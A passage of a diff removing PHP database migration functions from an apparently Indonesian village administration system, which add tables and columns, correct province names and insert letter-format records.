-				(61,  'Kalimantan Barat'),
-				(62,  'Kalimantan Tengah'),
-				(63,  'Kalimantan Selatan'),
-				(64,  'Kalimantan Timur'),
-				(65,  'Kalimantan Utara'),
-				(71,  'Sulawesi Utara'),
-				(72,  'Sulawesi Tengah'),
-				(73,  'Sulawesi Selatan'),
-				(74,  'Sulawesi Tenggara'),
-				(75,  'Gorontalo'),
-				(76,  'Sulawesi Barat'),
-				(81,  'Maluku'),
-				(82,  'Maluku Utara'),
-				(91,  'Papua'),
-				(92,  'Papua Barat')
-			";
-			$this->db->query($query);
-		}
-		// Konversi nama provinsi tersimpan di identitas desa
-		$konversi = array(
-			"ntb" => "Nusa Tenggara Barat",
-			"ntt" => "Nusa Tenggara Timur",
-			"daerah istimewa yogyakarta" => "DI Yogyakarta",
-			"diy" => "DI Yogyakarta",
-			"yogyakarta" => "DI Yogyakarta",
-			"jabar" => "Jawa Barat",
-			"jawabarat" => "Jawa Barat",
-			"jateng" => "Jawa Tengah",
-			"jatim" => "Jawa Timur",
-			"jatimi" => "Jawa Timur",
-			"jawa timu" => "Jawa Timur",
-			"nad" => "Aceh",
-			"kalimatnan barat" => "Kalimantan Barat",
-			"sulawesi teanggara" => "Sulawesi Tenggara"
-		);
-		$nama_propinsi = $this->db->select('nama_propinsi')->where('id', '1')->get('config')->row()->nama_propinsi;
-		foreach ($konversi as $salah => $benar) {
-			if(strtolower($nama_propinsi) == $salah) {
-				$this->db->where('id', '1')->update('config', array('nama_propinsi' => $benar));
-				break;
-			}
-		}
-		// Tambah lampiran untuk Surat Keterangan Kematian
-		$this->db->where('url_surat','surat_ket_kematian')->update('tweb_surat_format', array('lampiran'=>'f-2.29.php'));
-		// Ubah nama lampiran untuk Surat Keterangan Kelahiran
-		$this->db->where('url_surat','surat_ket_kelahiran')->update('tweb_surat_format', array('lampiran'=>'f-2.01.php'));
-		// Tambah modul Sekretariat di urutan sesudah Cetak Surat
-		$list_modul = array(
-			"5"  => 6,    // Analisis
-			"6"  => 7,    // Bantuan
-			"7"  => 8,    // Persil
-			"8"  => 9,    // Plan
-			"9"  => 10,   // Peta
-			"10" => 11,   // SMS
-			"11" => 12,   // Pengguna
-			"12" => 13,   // Database
-			"13" => 14,   // Admin Web
-			"14" => 15);  // Laporan
-		foreach ($list_modul as $key => $value)
-		{
-			$this->db->where('id',$key)->update('setting_modul', array('urut' => $value));
-		}
-		$query = "
-			INSERT INTO setting_modul (id, modul, url, aktif, ikon, urut, level, hidden, ikon_kecil) VALUES
-			('15','Sekretariat','sekretariat','1','applications-office-5.png','5','2','0','fa fa-print fa-lg')
-			ON DUPLICATE KEY UPDATE
-				modul = VALUES(modul),
-				url = VALUES(url)";
-		$this->db->query($query);
-		// Tambah folder desa/upload/media
-		if (!file_exists('/desa/upload/media'))
-		{
-			mkdir('desa/upload/media');
-			xcopy('desa-contoh/upload/media', 'desa/upload/media');
-		}
-		if (!file_exists('/desa/upload/thumbs'))
-		{
-			mkdir('desa/upload/thumbs');
-			xcopy('desa-contoh/upload/thumbs', 'desa/upload/thumbs');
-		}
-		// Tambah kolom kode di tabel kelompok
-		if (!$this->db->field_exists('kode', 'kelompok'))
-		{
-			$fields = array(
-				'kode' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 16,
-					'null' => FALSE
-				)
-			);
-			$this->dbforge->add_column('kelompok', $fields);
-		}
-		// Tambah kolom no_anggota di tabel kelompok_anggota
-		if (!$this->db->field_exists('no_anggota', 'kelompok_anggota'))
-		{
-			$fields = array(
-				'no_anggota' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 20,
-					'null' => FALSE
-				)
-			);
-			$this->dbforge->add_column('kelompok_anggota', $fields);
-		}
-	}
-
-	private function migrasi_24_ke_25()
-	{
-		// Tambah setting current_version untuk migrasi
-		$setting = $this->db->where('key','current_version')->get('setting_aplikasi')->row()->id;
-		if (!$setting)
-		{
-			$this->db->insert('setting_aplikasi',array('key'=>'current_version','value'=>'2.4','keterangan'=>'Versi sekarang untuk migrasi'));
-		}
-		// Tambah kolom ikon_kecil di tabel setting_modul
-		if (!$this->db->field_exists('ikon_kecil', 'setting_modul'))
-		{
-			$fields = array(
-				'ikon_kecil' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 50
-				)
-			);
-			$this->dbforge->add_column('setting_modul', $fields);
-			$list_modul = array(
-				"1" => "fa fa-home fa-lg",         // SID Home
-				"2" => "fa fa-group fa-lg",        // Penduduk
-				"3" => "fa fa-bar-chart fa-lg",    // Statistik
-				"4" => "fa fa-print fa-lg",        // Cetak Surat
-				"5" => "fa fa-dashboard fa-lg",    // Analisis
-				"6" => "fa fa-folder-open fa-lg",  // Bantuan
-				"7" => "fa fa-road fa-lg",         // Persil
-				"8" => "fa fa-sitemap fa-lg",      // Plan
-				"9" => "fa fa-map fa-lg",          // Peta
-				"10" => "fa fa-envelope-o fa-lg",  // SMS
-				"11" => "fa fa-user-plus fa-lg",   // Pengguna
-				"12" => "fa fa-database fa-lg",    // Database
-				"13" => "fa fa-cloud fa-lg",       // Admin Web
-				"14" => "fa fa-comments fa-lg");   // Laporan
-			foreach ($list_modul as $key => $value)
-			{
-				$this->db->where('id',$key)->update('setting_modul', array('ikon_kecil' => $value));
-			}
-		}
-		// Tambah kolom id_pend di tabel tweb_penduduk_mandiri
-		if (!$this->db->field_exists('id_pend', 'tweb_penduduk_mandiri'))
-		{
-			$fields = array(
-				'id_pend' => array(
-					'type' => 'int',
-					'constraint' => 9,
-					'null' => FALSE,
-					'first' => TRUE
-				)
-			);
-			$this->dbforge->add_column('tweb_penduduk_mandiri', $fields);
-		}
-		// Isi kolom id_pend
-		$mandiri = $this->db->select('nik')->get('tweb_penduduk_mandiri')->result_array();
-		foreach ($mandiri as $individu) {
-			$id_pend = $this->db->select('id')->where('nik', $individu['nik'])->get('tweb_penduduk')->row()->id;
-			if (empty($id_pend))
-				$this->db->where('nik',$individu['nik'])->delete('tweb_penduduk_mandiri');
-			else
-				$this->db->where('nik',$individu['nik'])->update('tweb_penduduk_mandiri',array('id_pend' => $id_pend));
-		}
-		// Buat id_pend menjadi primary key
-		$sql = "ALTER TABLE tweb_penduduk_mandiri
-							DROP PRIMARY KEY,
-							ADD PRIMARY KEY (id_pend)";
-		$this->db->query($sql);
-		// Tambah kolom kategori di tabel dokumen
-		if (!$this->db->field_exists('kategori', 'dokumen'))
-		{
-			$fields = array(
-				'kategori' => array(
-					'type' => 'tinyint',
-					'constraint' => 3,
-					'default' => 1
-				)
-			);
-			$this->dbforge->add_column('dokumen', $fields);
-		}
-		// Tambah kolom attribute dokumen
-		if (!$this->db->field_exists('attr', 'dokumen'))
-		{
-			$fields = array(
-				'attr' => array(
-					'type' => 'text'
-				)
-			);
-			$this->dbforge->add_column('dokumen', $fields);
-		}
-	}
-
-	private function migrasi_23_ke_24()
-	{
-		// Tambah surat keterangan beda identitas KIS
-		$data = array(
-			'nama'=>'Keterangan Beda Identitas KIS',
-			'url_surat'=>'surat_ket_beda_identitas_kis',
-			'kode_surat'=>'S-38',
-			'jenis'=>1);
-		$sql = $this->db->insert_string('tweb_surat_format', $data);
-		$sql .= " ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis)";
-		$this->db->query($sql);
-		// Tambah setting sebutan kepala dusun
-		$setting = $this->db->where('key','sebutan_singkatan_kadus')->get('setting_aplikasi')->row()->id;
-		if (!$setting)
-		{
-			$this->db->insert('setting_aplikasi',array('key'=>'sebutan_singkatan_kadus','value'=>'kawil','keterangan'=>'Sebutan singkatan jabatan kepala dusun'));
-		}
-	}
-
-	private function migrasi_22_ke_23()
-	{
-		// Tambah widget menu_left untuk menampilkan menu kategori
-		$widget = $this->db->select('id')->where('isi','menu_kategori.php')->get('widget')->row();
-		if (!$widget->id)
-		{
-			$menu_kategori = array('judul'=>'Menu Kategori','isi'=>'menu_kategori.php','enabled'=>1,'urut'=>1,'jenis_widget'=>1);
-			$this->db->insert('widget',$menu_kategori);
-		}
-		// Tambah tabel surat_masuk
-		if (!$this->db->table_exists('surat_masuk') )
-		{
-			$query = "
-				CREATE TABLE `surat_masuk` (
-					`id` int NOT NULL AUTO_INCREMENT,
-					`nomor_urut` smallint(5),
-					`tanggal_penerimaan` date NOT NULL,
-					`nomor_surat` varchar(20),
-					`kode_surat` varchar(10),
-					`tanggal_surat` date NOT NULL,
-					`pengirim` varchar(100),
-					`isi_singkat` varchar(200),
-					`disposisi_kepada` varchar(50),
-					`isi_disposisi` varchar(200),
-					`berkas_scan` varchar(100),
-					PRIMARY KEY  (`id`)
-				);
-			";
-			$this->db->query($query);
-		}
-		// Artikel bisa di-comment atau tidak
-		if (!$this->db->field_exists('boleh_komentar', 'artikel'))
-		{
-			$fields = array(
-				'boleh_komentar' => array(
-					'type' => 'tinyint',
-					'constraint' => 1,
-					'default' => 1
-				)
-			);
-			$this->dbforge->add_column('artikel', $fields);
-		}
-	}
-
-	private function migrasi_21_ke_22()
-	{
-		// Tambah lampiran untuk Surat Keterangan Kelahiran
-		$this->db->where('url_surat','surat_ket_kelahiran')->update('tweb_surat_format',array('lampiran'=>'f-kelahiran.php'));
-		// Tambah setting sumber gambar slider
-		$pilihan_sumber = $this->db->where('key','sumber_gambar_slider')->get('setting_aplikasi')->row()->id;
-		if (!$pilihan_sumber)
-		{
-			$this->db->insert('setting_aplikasi',array('key'=>'sumber_gambar_slider','value'=>1,'keterangan'=>'Sumber gambar slider besar'));
-		}
-		// Tambah gambar kartu peserta program bantuan
-		if (!$this->db->field_exists('kartu_peserta', 'program_peserta'))
-		{
-			$fields = array(
-				'kartu_peserta' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-				)
-			);
-			$this->dbforge->add_column('program_peserta', $fields);
-		}
-	}
-
-	private function migrasi_20_ke_21()
-	{
-		if (!$this->db->table_exists('widget') )
-		{
-			$query = "
-				CREATE TABLE `widget` (
-					`id` int NOT NULL AUTO_INCREMENT,
-					`isi` text,
-					`enabled` int(2),
-					`judul` varchar(100),
-					`jenis_widget` tinyint(2) NOT NULL DEFAULT 3,
-					`urut` int(5),
-					PRIMARY KEY  (`id`)
-				);
-			";
-			$this->db->query($query);
-			// Pindahkan data widget dari tabel artikel ke tabel widget
-			$widgets = $this->db->select('isi, enabled, judul, jenis_widget, urut')->where('id_kategori', 1003)->get('artikel')->result_array();
-			foreach ($widgets as $widget)
-			{
-				$this->db->insert('widget', $widget);
-			}
-			// Hapus kolom widget dari tabel artikel
-			$kolom_untuk_dihapus = array("urut", "jenis_widget");
-			foreach ($kolom_untuk_dihapus as $kolom){
-				$this->dbforge->drop_column('artikel', $kolom);
-			}
-		}
-		// Hapus setiap kali migrasi, karena ternyata masih ada di database contoh s/d v2.4
-		// TODO: pindahkan ini jika nanti ada kategori dengan nilai 1003.
-		$this->db->where('id_kategori',1003)->delete('artikel');
-		// Tambah tautan ke form administrasi widget
-		if (!$this->db->field_exists('form_admin', 'widget'))
-		{
-			$fields = array(
-				'form_admin' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-				)
-			);
-			$this->dbforge->add_column('widget', $fields);
-			$this->db->where('isi','layanan_mandiri.php')->update('widget',array('form_admin'=>'mandiri'));
-			$this->db->where('isi','aparatur_desa.php')->update('widget',array('form_admin'=>'pengurus'));
-			$this->db->where('isi','agenda.php')->update('widget',array('form_admin'=>'web/index/1000'));
-			$this->db->where('isi','galeri.php')->update('widget',array('form_admin'=>'gallery'));
-			$this->db->where('isi','komentar.php')->update('widget',array('form_admin'=>'komentar'));
-			$this->db->where('isi','media_sosial.php')->update('widget',array('form_admin'=>'sosmed'));
-			$this->db->where('isi','peta_lokasi_kantor.php')->update('widget',array('form_admin'=>'hom_desa'));
-		}
-		// Tambah kolom setting widget
-		if (!$this->db->field_exists('setting', 'widget'))
-		{
-			$fields = array(
-				'setting' => array(
-					'type' => 'text'
-				)
-			);
-			$this->dbforge->add_column('widget', $fields);
-		}
-		// Ubah nama widget menjadi sinergi_program
-		$this->db->select('id')->where('isi','sinergitas_program.php')->update('widget', array('isi'=>'sinergi_program.php', 'judul'=>'Sinergi Program','form_admin'=>'web_widget/admin/sinergi_program'));
-		// Tambah widget sinergi_program
-		$widget = $this->db->select('id')->where('isi','sinergi_program.php')->get('widget')->row();
-		if (!$widget->id)
-		{
-			$widget_baru = array('judul'=>'Sinergi Program','isi'=>'sinergi_program.php','enabled'=>1,'urut'=>1,'jenis_widget'=>1,'form_admin'=>'web_widget/admin/sinergi_program');
-			$this->db->insert('widget',$widget_baru);
-		}
-	}
-
-	private function migrasi_117_ke_20()
-	{
-		if (!$this->db->table_exists('setting_aplikasi') )
-		{
-			$query = "
-				CREATE TABLE `setting_aplikasi` (
-					`id` int NOT NULL AUTO_INCREMENT,
-					`key` varchar(50),
-					`value` varchar(200),
-					`keterangan` varchar(200),
-					`jenis` varchar(30),
-					`kategori` varchar(30),
-					PRIMARY KEY  (`id`)
-				);
-			";
-			$this->db->query($query);
-
-			$this->reset_setting_aplikasi();
-		}
-		// Update untuk tambahan offline mode 2, sesudah masuk pra-rilis (ada yang sudah migrasi)
-		$this->db->where('id',12)->update('setting_aplikasi',array('value'=>'0','jenis'=>''));
-		// Update media_sosial
-		$this->db->where('id',3)->update('media_sosial',array('nama'=>'Google Plus'));
-		$this->db->where('id',4)->update('media_sosial',array('nama'=>'YouTube'));
-		// Tambah widget aparatur_desa
-		$widget = $this->db->select('id')->where(array('isi'=>'aparatur_desa.php', 'id_kategori'=>1003))->get('artikel')->row();
-		if (!$widget->id)
-		{
-			$aparatur_desa = array('judul'=>'Aparatur Desa','isi'=>'aparatur_desa.php','enabled'=>1,'id_kategori'=>1003,'urut'=>1,'jenis_widget'=>1);
-			$this->db->insert('artikel',$aparatur_desa);
-		}
-		// Tambah foto aparatur desa
-		if (!$this->db->field_exists('foto', 'tweb_desa_pamong'))
-		{
-			$fields = array(
-				'foto' => array(
-					'type' => 'VARCHAR',
-					'constraint' => 100
-				)
-			);
-			$this->dbforge->add_column('tweb_desa_pamong', $fields);
-		}
-	}
-
-	private function migrasi_116_ke_117()
-	{
-		// Tambah kolom log_penduduk
-		if (!$this->db->field_exists('no_kk', 'log_penduduk'))
-		{
-			$query = "ALTER TABLE log_penduduk ADD no_kk decimal(16,0)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('nama_kk', 'log_penduduk'))
-		{
-			$query = "ALTER TABLE log_penduduk ADD nama_kk varchar(100)";
-			$this->db->query($query);
-		}
-		// Hapus surat_ubah_sesuaikan
-		$this->db->where('url_surat', 'surat_ubah_sesuaikan')->delete('tweb_surat_format');
-		// Tambah kolom log_surat untuk surat non-warga
-		if (!$this->db->field_exists('nik_non_warga', 'log_surat'))
-		{
-			$query = "ALTER TABLE log_surat ADD nik_non_warga decimal(16,0)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('nama_non_warga', 'log_surat'))
-		{
-			$query = "ALTER TABLE log_surat ADD nama_non_warga varchar(100)";
-			$this->db->query($query);
-		}
-		$query = "ALTER TABLE log_surat MODIFY id_pend int(11) DEFAULT NULL";
-		$this->db->query($query);
-		// Tambah contoh surat non-warga
-		$query = "
-			INSERT INTO tweb_surat_format(nama, url_surat, kode_surat, jenis) VALUES
-			('Domisili Usaha Non-Warga', 'surat_domisili_usaha_non_warga', 'S-37', 1)
-			ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat),
-				kode_surat = VALUES(kode_surat),
-				jenis = VALUES(jenis);
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_115_ke_116()
-	{
-		// Ubah surat N-1 menjadi surat gabungan N-1 s/d N-7
-		$this->db->where('url_surat','surat_ket_nikah')->update('tweb_surat_format',array('nama'=>'Keterangan Untuk Nikah (N-1 s/d N-7)'));
-		// Hapus surat N-2 s/d N-7 yang sudah digabungkan ke surat_ket_nikah
-		$this->db->where('url_surat','surat_ket_asalusul')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_persetujuan_mempelai')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_ket_orangtua')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_izin_orangtua')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_ket_kematian_suami_istri')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_kehendak_nikah')->delete('tweb_surat_format');
-		$this->db->where('url_surat','surat_ket_wali')->delete('tweb_surat_format');
-		// Tambah kolom untuk penandatangan surat
-		if (!$this->db->field_exists('pamong_ttd', 'tweb_desa_pamong')) {
-			$query = "ALTER TABLE tweb_desa_pamong ADD pamong_ttd tinyint(1)";
-			$this->db->query($query);
-		}
-		// Hapus surat_pindah_antar_kab_prov
-		$this->db->where('url_surat','surat_pindah_antar_kab_prov')->delete('tweb_surat_format');
-	}
-
-	private function migrasi_114_ke_115()
-	{
-		// Tambah kolom untuk peserta program
-		if (!$this->db->field_exists('kartu_nik', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD kartu_nik decimal(16,0)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kartu_nama', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD kartu_nama varchar(100)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kartu_tempat_lahir', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD kartu_tempat_lahir varchar(100)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kartu_tanggal_lahir', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD kartu_tanggal_lahir date";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kartu_alamat', 'program_peserta'))
-		{
-			$query = "ALTER TABLE program_peserta ADD kartu_alamat varchar(200)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_113_ke_114()
-	{
-		// Tambah kolom untuk slider
-		if (!$this->db->field_exists('slider', 'gambar_gallery'))
-		{
-			$query = "ALTER TABLE gambar_gallery ADD slider tinyint(1)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_112_ke_113()
-	{
-		// Tambah data desa
-		if (!$this->db->field_exists('nip_kepala_desa', 'config'))
-		{
-			$query = "ALTER TABLE config ADD nip_kepala_desa decimal(18,0)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('email_desa', 'config'))
-		{
-			$query = "ALTER TABLE config ADD email_desa varchar(50)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('telepon', 'config'))
-		{
-			$query = "ALTER TABLE config ADD telepon varchar(50)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('website', 'config'))
-		{
-			$query = "ALTER TABLE config ADD website varchar(100)";
-			$this->db->query($query);
-		}
-		// Gabung F-1.15 dan F-1.01 menjadi satu lampiran surat_permohonan_kartu_keluarga
-		$this->db->where('url_surat','surat_permohonan_kartu_keluarga')->update('tweb_surat_format',array('lampiran'=>'f-1.15.php,f-1.01.php'));
-	}
-
-	// Berdasarkan analisa database yang dikirim oleh AdJie Reverb Impulse
-	private function migrasi_cri_lama()
-	{
-		if (!$this->db->field_exists('enabled', 'kategori'))
-		{
-			$query = "ALTER TABLE kategori ADD enabled tinyint(4) DEFAULT 1";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('parrent', 'kategori'))
-		{
-			$query = "ALTER TABLE kategori ADD parrent tinyint(4) DEFAULT 0";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kode_surat', 'tweb_surat_format'))
-		{
-			$query = "ALTER TABLE tweb_surat_format ADD kode_surat varchar(10)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_03_ke_04()
-	{
-		$query = "
-			CREATE TABLE IF NOT EXISTS `tweb_penduduk_mandiri` (
-				`nik` decimal(16,0) NOT NULL,
-				`pin` char(32) NOT NULL,
-				`last_login` datetime,
-				`tanggal_buat` date NOT NULL,
-				PRIMARY KEY  (`nik`)
-			);
-		";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE IF NOT EXISTS `program` (
-				`id` int NOT NULL AUTO_INCREMENT,
-				`nama` varchar(100) NOT NULL,
-				`sasaran` tinyint,
-				`ndesc` varchar(200),
-				`sdate` date NOT NULL,
-				`edate` date NOT NULL,
-				`userid` mediumint NOT NULL,
-				`status` int(10),
-				PRIMARY KEY  (`id`)
-			);
-		";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE IF NOT EXISTS `program_peserta` (
-				`id` int NOT NULL AUTO_INCREMENT,
-				`peserta` decimal(16,0) NOT NULL,
-				`program_id` int NOT NULL,
-				`sasaran` tinyint,
-				PRIMARY KEY  (`id`)
-			);
-		";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE IF NOT EXISTS `data_persil` (
-				`id` int NOT NULL AUTO_INCREMENT,
-				`nik` decimal(16,0) NOT NULL,
-				`nama` varchar(100) NOT NULL,
-				`persil_jenis_id` int NOT NULL,
-				`id_clusterdesa` int NOT NULL,
-				`luas` int,
-				`no_sppt_pbb` int,
-				`kelas` varchar(50),
-				`persil_peruntukan_id` int NOT NULL,
-				`alamat_ext` varchar(100),
-				`userID` mediumint,
-				PRIMARY KEY  (`id`)
-			);
-		";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE IF NOT EXISTS `data_persil_peruntukan` (
-				`id` int NOT NULL AUTO_INCREMENT,
-				`nama` varchar(100) NOT NULL,
-				`ndesc` varchar(200),
-				PRIMARY KEY  (`id`)
-			);
-		";
-		$this->db->query($query);
-
-		$query = "
-			CREATE TABLE IF NOT EXISTS `data_persil_jenis` (
-				`id` int NOT NULL AUTO_INCREMENT,
-				`nama` varchar(100) NOT NULL,
-				`ndesc` varchar(200),
-				PRIMARY KEY  (`id`)
-			);
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_08_ke_081()
-	{
-		if (!$this->db->field_exists('nama_surat', 'log_surat'))
-		{
-			$query = "ALTER TABLE `log_surat` ADD `nama_surat` varchar(100)";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_082_ke_09()
-	{
-		if (!$this->db->field_exists('catatan', 'log_penduduk'))
-		{
-			$query = "ALTER TABLE `log_penduduk` ADD `catatan` text";
-			$this->db->query($query);
-		}
-	}
-
-	private function migrasi_092_ke_010()
-	{
-		// CREATE UNIQUE INDEX migrasi_0_10_url_surat ON tweb_surat_format (url_surat);
-
-		// Hapus surat duplikat
-		$kriteria = array('id' => 19, 'url_surat' => 'surat_ket_kehilangan');
-		$this->db->where($kriteria);
-		$this->db->delete('tweb_surat_format');
-
-		$query = "
-			INSERT INTO `tweb_surat_format` (`id`, `nama`, `url_surat`, `kode_surat`) VALUES
-			(1, 'Keterangan Pengantar', 'surat_ket_pengantar', 'S-01'),
-			(2, 'Keterangan Penduduk', 'surat_ket_penduduk', 'S-02'),
-			(3, 'Biodata Penduduk', 'surat_bio_penduduk', 'S-03'),
-			(5, 'Keterangan Pindah Penduduk', 'surat_ket_pindah_penduduk', 'S-04'),
-			(6, 'Keterangan Jual Beli', 'surat_ket_jual_beli', 'S-05'),
-			(7, 'Pengantar Pindah Antar Kabupaten/ Provinsi', 'surat_pindah_antar_kab_prov', 'S-06'),
-			(8, 'Pengantar Surat Keterangan Catatan Kepolisian', 'surat_ket_catatan_kriminal', 'S-07'),
-			(9, 'Keterangan KTP dalam Proses', 'surat_ket_ktp_dalam_proses', 'S-08'),
-			(10, 'Keterangan Beda Identitas', 'surat_ket_beda_nama', 'S-09'),
-			(11, 'Keterangan Bepergian / Jalan', 'surat_jalan', 'S-10'),
-			(12, 'Keterangan Kurang Mampu', 'surat_ket_kurang_mampu', 'S-11'),
-			(13, 'Pengantar Izin Keramaian', 'surat_izin_keramaian', 'S-12'),
-			(14, 'Pengantar Laporan Kehilangan', 'surat_ket_kehilangan', 'S-13'),
-			(15, 'Keterangan Usaha', 'surat_ket_usaha', 'S-14'),
-			(16, 'Keterangan JAMKESOS', 'surat_ket_jamkesos', 'S-15'),
-			(17, 'Keterangan Domisili Usaha', 'surat_ket_domisili_usaha', 'S-16'),
-			(18, 'Keterangan Kelahiran', 'surat_ket_kelahiran', 'S-17'),
-			(20, 'Permohonan Akta Lahir', 'surat_permohonan_akta', 'S-18'),
-			(21, 'Pernyataan Belum Memiliki Akta Lahir', 'surat_pernyataan_akta', 'S-19'),
-			(22, 'Permohonan Duplikat Kelahiran', 'surat_permohonan_duplikat_kelahiran', 'S-20'),
-			(24, 'Keterangan Kematian', 'surat_ket_kematian', 'S-21'),
-			(25, 'Keterangan Lahir Mati', 'surat_ket_lahir_mati', 'S-22'),
-			(26, 'Keterangan Untuk Nikah (N-1)', 'surat_ket_nikah', 'S-23'),
-			(27, 'Keterangan Asal Usul (N-2)', 'surat_ket_asalusul', 'S-24'),
-			(28, 'Persetujuan Mempelai (N-3)', 'surat_persetujuan_mempelai', 'S-25'),
-			(29, 'Keterangan Tentang Orang Tua (N-4)', 'surat_ket_orangtua', 'S-26'),
-			(30, 'Keterangan Izin Orang Tua(N-5)', 'surat_izin_orangtua', 'S-27'),
-			(31, 'Keterangan Kematian Suami/Istri(N-6)', 'surat_ket_kematian_suami_istri', 'S-28'),
-			(32, 'Pemberitahuan Kehendak Nikah (N-7)', 'surat_kehendak_nikah', 'S-29'),
-			(33, 'Keterangan Pergi Kawin', 'surat_ket_pergi_kawin', 'S-30'),
-			(34, 'Keterangan Wali', 'surat_ket_wali', 'S-31'),
-			(35, 'Keterangan Wali Hakim', 'surat_ket_wali_hakim', 'S-32'),
-			(36, 'Permohonan Duplikat Surat Nikah', 'surat_permohonan_duplikat_surat_nikah', 'S-33'),
-			(37, 'Permohonan Cerai', 'surat_permohonan_cerai', 'S-34'),
-			(38, 'Keterangan Pengantar Rujuk/Cerai', 'surat_ket_rujuk_cerai', 'S-35')
-			ON DUPLICATE KEY UPDATE
-				nama = VALUES(nama),
-				url_surat = VALUES(url_surat);
-		";
-		$this->db->query($query);
-		// surat_ubah_sesuaikan perlu ditangani berbeda, karena ada pengguna di mana
-		// url surat_ubah_sesuaikan memiliki id yang bukan 39, sedangkan id 39 juga dipakai untuk surat lain
-		$this->db->where('url_surat', 'surat_ubah_sesuaikan');
-		$query = $this->db->get('tweb_surat_format');
-		// Tambahkan surat_ubah_sesuaikan apabila belum ada
-		if ($query->num_rows() == 0)
-		{
-			$data = array(
-				'nama' => 'Ubah Sesuaikan',
-				'url_surat' => 'surat_ubah_sesuaikan',
-				'kode_surat' => 'S-36'
-			);
-			$this->db->insert('tweb_surat_format', $data);
-		}
-
-		// DROP INDEX migrasi_0_10_url_surat ON tweb_surat_format;
-
-		/* Jangan buat index unik kode_surat, karena kolom ini digunakan
-			 untuk merekam klasifikasi surat yang tidak unik. */
-		// $db = $this->db->database;
-		// $query = "
-		//   SELECT COUNT(1) IndexIsThere FROM INFORMATION_SCHEMA.STATISTICS
-		//   WHERE table_schema=? AND table_name='tweb_surat_format' AND index_name='kode_surat';
-		// ";
-		// $hasil = $this->db->query($query, $db);
-		// $data = $hasil->row_array();
-		// if ($data['IndexIsThere'] == 0) {
-		//   $query = "
-		//     CREATE UNIQUE INDEX kode_surat ON tweb_surat_format (kode_surat);
-		//   ";
-		//   $this->db->query($query);
-		// }
-
-		if (!$this->db->field_exists('tgl_cetak_kk', 'tweb_keluarga'))
-		{
-			$query = "ALTER TABLE tweb_keluarga ADD tgl_cetak_kk datetime";
-			$this->db->query($query);
-		}
-		$query = "ALTER TABLE tweb_penduduk_mandiri MODIFY tanggal_buat datetime";
-		$this->db->query($query);
-	}
-
-	private function migrasi_010_ke_10()
-	{
-		$query = "
-			INSERT INTO tweb_penduduk_pekerjaan(id, nama) VALUES (89, 'LAINNYA')
-			ON DUPLICATE KEY UPDATE
-				id = VALUES(id),
-				nama = VALUES(nama);
-		";
-		$this->db->query($query);
-	}
-
-	private function migrasi_10_ke_11()
-	{
-		if (!$this->db->field_exists('kk_lk', 'log_bulanan'))
-		{
-			$query = "ALTER TABLE log_bulanan ADD kk_lk int(11)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('kk_pr', 'log_bulanan'))
-		{
-			$query = "ALTER TABLE log_bulanan ADD kk_pr int(11)";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->field_exists('urut', 'artikel'))
-		{
-			$query = "ALTER TABLE artikel ADD urut int(5)";
-			$this->db->query($query);
-		}
-		if (!$this->db->field_exists('jenis_widget', 'artikel'))
-		{
-			$query = "ALTER TABLE artikel ADD jenis_widget tinyint(2) NOT NULL DEFAULT 3";
-			$this->db->query($query);
-		}
-
-		if (!$this->db->table_exists('log_keluarga') )
-		{
-			$query = "
-				CREATE TABLE `log_keluarga` (
-					`id` int(10) NOT NULL AUTO_INCREMENT,
-					`id_kk` int(11) NOT NULL,
-					`kk_sex` tinyint(2) NOT NULL,
-					`id_peristiwa` int(4) NOT NULL,
-					`tgl_peristiwa` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-					PRIMARY KEY (`id`),
-					UNIQUE KEY `id_kk` (`id_kk`,`id_peristiwa`,`tgl_peristiwa`)
-				) ENGINE=".$this->engine." AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
-			";
-			$this->db->query($query);
-		}
-
-		$query = "
-			DROP VIEW IF EXISTS data_surat;
-		";
-		$this->db->query($query);
-
-		$query = "
-			DROP TABLE IF EXISTS data_surat;
-		";
-		$this->db->query($query);
-
-		$query = "
